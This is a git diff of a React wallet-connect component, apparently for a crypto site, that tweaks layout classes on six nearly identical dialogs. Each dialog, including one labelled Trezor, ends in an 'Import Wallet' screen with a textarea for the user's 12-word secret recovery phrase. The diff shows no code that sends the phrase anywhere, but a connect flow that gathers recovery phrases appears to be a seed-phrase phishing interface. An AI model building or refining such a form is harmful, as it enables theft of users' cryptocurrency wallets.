@@ -95,7 +95,7 @@ const Connect = () => {
                                     </button>
                                   </DialogTrigger>
 
-                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
+                                  <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                     <DialogHeader>
                                       <DialogDescription>
                                         <Carousel className="relative">
@@ -135,12 +135,12 @@ const Connect = () => {
                                             <CarouselItem className="flex justify-center text-center w-0">
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
-                                                <p className="text-start mt-5">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-1 mb-5" />
+                                                <p className="text-start mt-6">12 Word phrase</p>
+                                                <Textarea rows={4} className="mt-2 mb-8" />
                                                 <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                               </div>
                                             </CarouselItem>
@@ -164,7 +164,7 @@ const Connect = () => {
                                     </button>
                                   </DialogTrigger>
 
-                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
+                                  <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                     <DialogHeader>
                                       <DialogDescription>
                                         <Carousel className="relative">
@@ -204,16 +204,15 @@ const Connect = () => {
                                             <CarouselItem className="flex justify-center text-center w-0">
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
-                                                <p className="text-start mt-5">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-1 mb-5" />
+                                                <p className="text-start mt-6">12 Word phrase</p>
+                                                <Textarea rows={4} className="mt-2 mb-8" />
                                                 <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                               </div>
                                             </CarouselItem>
-
                                           </CarouselContent>
 
                                           <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
@@ -236,7 +235,7 @@ const Connect = () => {
                                     </button>
                                   </DialogTrigger>
 
-                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
+                                  <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                     <DialogHeader>
                                       <DialogDescription>
                                         <Carousel className="relative">
@@ -276,12 +275,12 @@ const Connect = () => {
                                             <CarouselItem className="flex justify-center text-center w-0">
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
-                                                <p className="text-start mt-5">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-1 mb-5" />
+                                                <p className="text-start mt-6">12 Word phrase</p>
+                                                <Textarea rows={4} className="mt-2 mb-8" />
                                                 <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                               </div>
                                             </CarouselItem>
@@ -298,7 +297,7 @@ const Connect = () => {
 
                                 {/* Trezor popup slider */}
                                 <Dialog>
-                                  <DialogTrigger className="w-full">
+                                  <DialogTrigger className="w-full lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                     {/* Trezor */}
                                     <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                       <img src={trezor} alt="Meta Mask" className="w-[35px] mr-3" />
@@ -306,7 +305,7 @@ const Connect = () => {
                                     </button>
                                   </DialogTrigger>
 
-                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
+                                  <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                     <DialogHeader>
                                       <DialogDescription>
                                         <Carousel className="relative">
@@ -346,12 +345,12 @@ const Connect = () => {
                                             <CarouselItem className="flex justify-center text-center w-0">
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
-                                                <p className="text-start mt-5">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-1 mb-5" />
+                                                <p className="text-start mt-6">12 Word phrase</p>
+                                                <Textarea rows={4} className="mt-2 mb-8" />
                                                 <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                               </div>
                                             </CarouselItem>
@@ -376,7 +375,7 @@ const Connect = () => {
                                     </button>
                                   </DialogTrigger>
 
-                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
+                                  <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                     <DialogHeader>
                                       <DialogDescription>
                                         <Carousel className="relative">
@@ -416,12 +415,12 @@ const Connect = () => {
                                             <CarouselItem className="flex justify-center text-center w-0">
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
-                                                <p className="text-start mt-5">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-1 mb-5" />
+                                                <p className="text-start mt-6">12 Word phrase</p>
+                                                <Textarea rows={4} className="mt-2 mb-8" />
                                                 <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                               </div>
                                             </CarouselItem>
@@ -446,7 +445,7 @@ const Connect = () => {
                                     </button>
                                   </DialogTrigger>
 
-                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
+                                  <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                     <DialogHeader>
                                       <DialogDescription>
                                         <Carousel className="relative">
@@ -486,12 +485,12 @@ const Connect = () => {
                                             <CarouselItem className="flex justify-center text-center w-0">
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
-                                                <p className="text-start mt-5">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-1 mb-5" />
+                                                <p className="text-start mt-6">12 Word phrase</p>
+                                                <Textarea rows={4} className="mt-2 mb-8" />
                                                 <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                               </div>
                                             </CarouselItem>
